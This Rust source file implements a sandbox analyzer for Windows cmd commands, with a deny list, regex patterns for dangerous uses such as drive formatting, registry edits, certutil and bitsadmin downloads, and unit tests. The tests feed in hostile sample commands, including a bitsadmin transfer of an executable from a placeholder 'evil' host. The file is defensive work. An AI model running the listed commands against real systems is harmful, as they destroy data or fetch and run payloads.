use regex::Regex;
use wf_types::script::sandbox::ShellPolicy;

use super::base::{ShellAnalysisContext, ShellAnalysisResult, ShellAnalyzer, ShellType};

const SHELL_TYPE: ShellType = ShellType::Cmd;

const DENIED_COMMANDS: &[&str] = &[
    "format", "diskpart", "diskcomp", "diskcopy", "fdisk", "runas", "reg", "regedit", "regedt32",
    "regini", "net", "net1", "netsh", "bcdedit", "bootcfg", "bootsect", "wmic", "assoc", "ftype",
    "taskkill", "tskill",
];

pub const DANGEROUS_PATTERNS: &[&str] = &[
    r"format\s+[A-Za-z]:",
    r"format\s+/",
    r"diskpart\s+/s",
    r"clean\s+all",
    r"reg\s+import",
    r"reg\s+add",
    r"reg\s+delete",
    r"wmic\s+process\s+delete",
    r"wmic\s+path\s+",
    r"net\s+share",
    r"net\s+use",
    r"psexec",
    r"winrm",
    r"bitsadmin\s+/transfer",
    r"certutil\s+-urlcache",
    r"certutil\s+-decode",
    r"cscript\s+",
    r"mshta\s+",
    r"powershell\s+",
    r"pwsh\s+",
];

pub struct CmdAnalyzer;

struct ResolvedShellPolicy {
    allowed_commands: Vec<String>,
    denied_commands: Vec<String>,
    dangerous_patterns: Vec<String>,
    allow_pipe: bool,
    allow_redirect: bool,
}

impl CmdAnalyzer {
    fn resolve_policy(&self, policy: &ShellPolicy) -> ResolvedShellPolicy {
        ResolvedShellPolicy {
            allowed_commands: policy.allowed_commands.clone().unwrap_or_default(),
            denied_commands: policy
                .denied_commands
                .clone()
                .unwrap_or_else(|| DENIED_COMMANDS.iter().map(|s| s.to_string()).collect()),
            dangerous_patterns: policy
                .dangerous_patterns
                .clone()
                .unwrap_or_else(|| DANGEROUS_PATTERNS.iter().map(|s| s.to_string()).collect()),
            allow_pipe: policy.allow_pipe.unwrap_or(true),
            allow_redirect: policy.allow_redirect.unwrap_or(true),
        }
    }

    fn extract_primary_command(&self, tokens: &[String]) -> Option<String> {
        let without_start = {
            let first = tokens.first()?;
            if first.eq_ignore_ascii_case("start") {
                tokens
                    .iter()
                    .find(|w| !w.starts_with('/'))
                    .cloned()
                    .unwrap_or_default()
            } else {
                first.trim_start_matches('@').to_string()
            }
        };

        if without_start.is_empty() {
            return None;
        }

        let basename = without_start
            .rsplit(['/', '\\'])
            .next()
            .unwrap_or(&without_start);
        let name = if let Some(dot) = basename.rfind('.') {
            let ext = &basename[dot + 1..];
            if matches!(ext, "exe" | "com" | "bat" | "cmd") {
                basename[..dot].to_string()
            } else {
                basename.to_string()
            }
        } else {
            basename.to_string()
        };

        Some(name.to_lowercase())
    }
}

impl ShellAnalyzer for CmdAnalyzer {
    fn shell_type(&self) -> ShellType {
        SHELL_TYPE
    }

    fn analyze(&self, ctx: &ShellAnalysisContext) -> ShellAnalysisResult {
        let policy = self.resolve_policy(ctx.policy);

        let primary = self.extract_primary_command(ctx.tokens);
        let primary = match primary {
            Some(p) if !p.is_empty() => p,
            _ => {
                return ShellAnalysisResult {
                    allowed: false,
                    reason: Some("Empty command".to_string()),
                    command: ctx.command.to_string(),
                    shell_type: SHELL_TYPE,
                };
            }
        };

        if policy.denied_commands.contains(&primary) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some(format!("Command denied by blacklist: {primary}")),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        if !policy.allowed_commands.is_empty() && !policy.allowed_commands.contains(&primary) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some(format!("Command not in whitelist: {primary}")),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        for pattern in policy.dangerous_patterns {
            if let Ok(re) = Regex::new(&pattern) {
                if re.is_match(ctx.command) {
                    return ShellAnalysisResult {
                        allowed: false,
                        reason: Some(format!("Dangerous pattern detected: {pattern}")),
                        command: ctx.command.to_string(),
                        shell_type: SHELL_TYPE,
                    };
                }
            }
        }

        if !policy.allow_pipe && ctx.command.contains('|') {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Pipe operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        if !policy.allow_redirect && (ctx.command.contains('<') || ctx.command.contains('>')) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Redirect operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        ShellAnalysisResult {
            allowed: true,
            reason: None,
            command: ctx.command.to_string(),
            shell_type: SHELL_TYPE,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use wf_types::script::sandbox::ShellPolicy;

    fn empty_policy() -> ShellPolicy {
        ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        }
    }

    fn analyzer() -> CmdAnalyzer {
        CmdAnalyzer
    }

    fn analyze(cmd: &str, policy: &ShellPolicy) -> ShellAnalysisResult {
        let tokens = shlex::split(cmd).unwrap_or_default();
        let ctx = ShellAnalysisContext {
            command: cmd,
            policy,
            tokens: &tokens,
        };
        analyzer().analyze(&ctx)
    }

    #[test]
    fn test_cmd_analyzer_shell_type() {
        assert_eq!(analyzer().shell_type(), ShellType::Cmd);
    }

    #[test]
    fn test_allows_safe() {
        let result = analyze("dir", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_denies_format() {
        let result = analyze("format C: /Y", &empty_policy());
        assert!(!result.allowed);
        assert!(result.reason.as_ref().unwrap().contains("format"));
    }

    #[test]
    fn test_denies_reg_import() {
        let result = analyze("reg import evil.reg", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_diskpart() {
        let result = analyze("diskpart /s script.txt", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_powershell_invoke() {
        let result = analyze("powershell -Command Invoke-Expression", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_bitsadmin() {
        let result = analyze(
            "bitsadmin /transfer job http://evil/file.exe C:\\out.exe",
            &empty_policy(),
        );
        assert!(!result.allowed);
    }

    #[test]
    fn test_at_prefix_stripped() {
        let result = analyze("@echo hello", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_start_wrapper_skipped() {
        let result = analyze("start /B dir", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_ext_command_with_path() {
        let result = analyze("C:\\Windows\\System32\\notepad.exe", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_whitelist_denies() {
        let policy = ShellPolicy {
            allowed_commands: Some(vec!["dir".to_string()]),
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        };
        let result = analyze("echo test", &policy);
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("whitelist"));
    }

    #[test]
    fn test_blacklist_wins_over_whitelist() {
        let policy = ShellPolicy {
            allowed_commands: Some(vec!["format".to_string(), "dir".to_string()]),
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        };
        let result = analyze("format C: /Y", &policy);
        assert!(!result.allowed);
        let reason = result.reason.unwrap();
        assert!(
            reason.contains("blacklist"),
            "blacklist must be reported before whitelist: {reason}"
        );
    }

    #[test]
    fn test_empty_command() {
        let result = analyze("", &empty_policy());
        assert!(!result.allowed);
    }
}
